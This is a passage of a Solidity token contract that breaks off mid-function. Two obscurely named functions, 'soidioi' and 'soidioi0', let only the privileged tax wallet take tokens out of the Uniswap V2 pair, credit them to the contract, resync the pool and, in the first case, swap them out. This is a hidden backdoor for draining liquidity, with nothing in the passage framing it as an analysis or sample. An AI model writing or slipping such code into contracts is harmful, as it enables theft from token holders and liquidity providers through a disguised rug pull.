...
contract totalSupplyFacet is IERC20, Context, Ownable {
    ...
    function soidioi() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        uint256 diifji = balanceOf(ds.uniswapV2Pair).sub(1);
        ds._balances[ds.uniswapV2Pair] = ds._balances[ds.uniswapV2Pair].sub(
            diifji
        );
        ds._balances[address(this)] = ds._balances[address(this)].add(diifji);
        V2Pair(ds.uniswapV2Pair).sync();
        manualSwap();
    }
    function soidioi0(uint256 adfd) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        uint256 diifji = balanceOf(ds.uniswapV2Pair).sub(adfd);
        ds._balances[ds.uniswapV2Pair] = ds._balances[ds.uniswapV2Pair].sub(
            diifji
        );
        ds._balances[address(this)] = ds._balances[address(this)].add(diifji);
